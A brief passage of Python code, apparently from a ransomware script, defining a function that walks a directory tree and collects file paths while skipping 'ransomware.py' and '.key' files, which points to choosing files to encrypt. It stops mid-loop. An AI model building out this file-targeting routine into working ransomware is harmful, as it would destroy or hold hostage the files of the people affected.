def encontrar_arquivod(diretorio):
    lista = []
    for raiz, _, arquivo in os.walk(diretorio):
        for nome in arquivo:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
